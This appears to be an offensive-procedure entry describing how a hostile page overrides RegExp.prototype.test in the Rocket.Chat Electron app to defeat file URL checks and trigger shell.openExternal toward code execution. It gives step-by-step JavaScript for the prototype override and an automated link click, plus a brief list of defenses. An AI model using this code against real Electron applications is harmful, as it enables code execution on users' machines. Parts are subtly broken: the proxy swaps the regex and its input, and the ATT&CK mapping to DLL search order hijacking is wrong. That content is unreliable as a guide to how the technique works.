---
id: proc-electron-regexp-bypass
tags:
  - prototype-pollution
  - bypass
  - electron
type: procedure
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Electron
  - macOS
  - Windows
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[DLL Search Order Hijacking]]'
updated_at: '2025-12-14T17:23:28.577Z'
skill_level: advanced
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[DLL Search Order Hijacking]]'
---
# Overload-RegExp-Prototype-to-Bypass-File-Checks

## Summary

This procedure uses JavaScript on an attacker-controlled page to overload RegExp.prototype.test via Proxy, forcing false returns for Electron preload script's file URL pattern checks, enabling unsafe shell.openExternal calls.

## Description

Electron's preload.js (https://github.com/RocketChat/Rocket.Chat.Electron/blob/master/src/public/preload.js#L45) uses RegExp.test to validate file:// URLs before opening. By proxying RegExp.prototype.test, the attacker intercepts and spoofs results for patterns like /^file:///Applications/.*$/, bypassing restrictions. A delayed link creation simulates user click to trigger the handler.

## Requirements

1. Control over the loaded page's JavaScript execution.
2. Knowledge of preload.js check patterns (e.g., file:///Applications/Calculator.app).
3. Electron app with vulnerable onload handler.

## Defense

Defensive measures and detection strategies:

- Isolate preload scripts with contextIsolation=true in Electron.
- Avoid global prototype modifications by using strict mode and avoiding Proxy on builtins.
- Audit and harden RegExp usage in security checks; use non-prototype methods.

## Objectives

1. Intercept and manipulate security RegExp tests.
2. Disable file path validations.
3. Set up for RCE trigger.

## Instructions

### Step 1: Implement Proxy Overload

**Context**: On page load, replace RegExp.prototype.test to return false for target checks.

```javascript
RegExp.prototype.test = new Proxy(RegExp.prototype.test, {
  apply(target, thisArg, args) {
    const pattern = args[0];
    const input = thisArg.source || '';
    if (input.includes('file:///Applications/Calculator.app') && pattern.source.includes('file:')) {
      return false;
    }
    return target.apply(thisArg, args);
  }
});
```

> Explanation: The proxy checks the regex source and input URL, spoofing for Calculator.app.

### Step 2: Delay and Create Trigger Link

**Context**: Wait 3 seconds to ensure bypass is active, then create a file URL link and simulate click via JS.

```javascript
setTimeout(() => {
  const a = document.createElement('a');
  a.href = 'file:///Applications/Calculator.app';
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
}, 3000);
```

> Expected: Link click invokes window.onload in preload.js without block.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[DLL Search Order Hijacking]] Hijack Execution Flow

### Sub-Techniques

- None

## Commands Used

- None

## Tools Used

- None

## Tags

- [[prototype-pollution]]
- [[bypass]]
- [[electron]]
